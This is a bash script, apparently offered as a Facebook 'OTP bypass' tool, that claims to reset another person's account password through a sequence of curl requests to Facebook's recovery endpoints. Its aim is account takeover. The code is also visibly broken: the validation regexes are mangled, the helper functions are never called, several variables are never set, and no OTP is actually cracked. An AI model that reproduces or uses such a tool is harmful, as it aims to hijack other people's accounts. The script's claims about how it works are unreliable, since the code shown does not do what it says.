#!/bin/bash

# This script recovers a Facebook password using a cracked OTP and changes the password.

# USAGE:
# ./Fb_otp_bypass.sh <email> <phone_number> <new_password>

# EMAIL and PHONE_NUMBER must be valid.

# Example:
# ./Fb_otp_bypass.sh richmond@example.com +2376537127 newpassword123

# Check if the user has entered a valid email address
function check_email_address() {
 if ! [[ ${1} =~ ^[a-zA-Z0-9\.\\_%\\\+\\\-]+\@[a-zA-Z0-9\.\-\]+\.[a-zA-Z]{2,} ]]; then
 echo "Invalid email address."
 exit 1
 fi
}

# Check if the user has entered a valid phone number
function check_phone_number() {
 if ! [[ ${1} =~ ^\\\+\\\\\[0\-9\]\{1,3\}\[0\-9\]\{7,14\} ]]; then
 echo "Invalid phone number."
 exit 1
 fi
}

# Prompt the user to enter the OTP if they have it
function get_otp() {
 echo "Do you have an OTP? (y/n)"
 read has_otp

 if [[ $has_otp == "y" ]]; then
 echo "Enter the OTP you have already tried: "
 read -s otp

 if [ -n "$otp" ]; then
  return $otp
 fi
 fi

 return ""
}

# Set the curl command options
CURL_OPTIONS="-i -s -k -X GET"

# Get the headers and cookies from the URL
function get_headers_and_cookies() {
 HEADERS=$(curl $CURL_OPTIONS "https://www.facebook.com/recover/code/?ph%5B0%5D=$1")

 # Extract the cookies from the headers
 COOKIES=$(grep -Po "Set-Cookie: \K[^;]*" <<< "$HEADERS")

 echo "$HEADERS"
 echo "$COOKIES"
}

# Make a POST request
function make_post_request() {
 local headers=$1
 local cookies=$2
 local post_data=$3
 local url=$4

 response=$(curl ${CURL_OPTIONS} $headers -b "$cookies" --data-binary "$post_data" "$url")

 echo "$response"
}

# Check if the OTP was correct
function check_otp_correct() {
 local response=$1

 if grep -q "Password changed successfully" <<< "$response"; then
 echo "true"
 else
 echo "false"
 fi
}

# Initiate the password reset
response=$(curl ${CURL_OPTIONS} $headers -b "$cookies" "https://www.facebook.com/recover/initiate")

# Identify the account
response=$(curl ${CURL_OPTIONS} $headers -b "$cookies" "https://www.facebook.com/ajax/login/help/identify.php")

# Check the BZ status
response=$(curl ${CURL_OPTIONS} $headers -b "$cookies" "https://www.facebook.com/ajax/bz")

# Get the recovery code
response=$(curl ${CURL_OPTIONS} $headers -b "$cookies" "https://www.facebook.com/recover/code")

# Change the password
response=$(curl ${CURL_OPTIONS} $headers -b "$cookies" --data-urlencode "new_password=$new_password" "https://www.facebook.com/password/change/reason/?next=https://m.facebook.com/composer/mbasic%2F")

# Check if the password reset was successful
if ! grep -q "Password changed successfully" <<< "$response"; then
 echo "Failed to reset password."
 exit 1
fi

echo "Password reset successfully!"                                                                                                                                                                                                                                                                                                                    
